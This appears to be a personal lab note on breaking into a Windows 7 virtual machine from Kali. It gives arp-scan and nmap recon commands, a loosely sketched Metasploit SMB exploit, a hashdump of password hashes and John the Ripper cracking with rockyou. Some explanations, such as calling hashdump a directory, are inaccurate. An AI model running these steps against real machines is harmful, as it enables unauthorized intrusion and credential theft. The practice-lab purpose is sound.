
## Cracking a windows 7 machine

Since both kali and windows machine are connected to the same nat adapter we can conduct an arp scan [[ARP]]

```
sudo arp-scan -l -I eth0

```
Using arp-scan -L is for listner and -I is for interface of eth0

To identify the os from the machines found we use nmap
```
nmap -O "ip"
```

Conduct a full port scan using
```
nmap -Pn -p- "ip"
```


Scan the ports found for services runing
```
nmap -Pn -p 135,139,445,49152,49153,49154,49155,49156 -sV -vv -oN service-enum.txt 192.168.56.129
```

Scan for scirpts vuln
```
nmap -Pn -p135,139,445 --script vuln -oN vuln.txt 192.168.56.129
```

SMB vuln found

Use metaexploit

search the vuln 
```
search "vunl name"
```

now set LHOST and RHOST
 and exploit
 ```
 exploit
```

got into system use hashdump
*a directory in windows 7 where passwords are saved*

set hashvalue

Now use John to crack the hash value using wordlist

```
john --format=NT hash1.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

**and we get password**










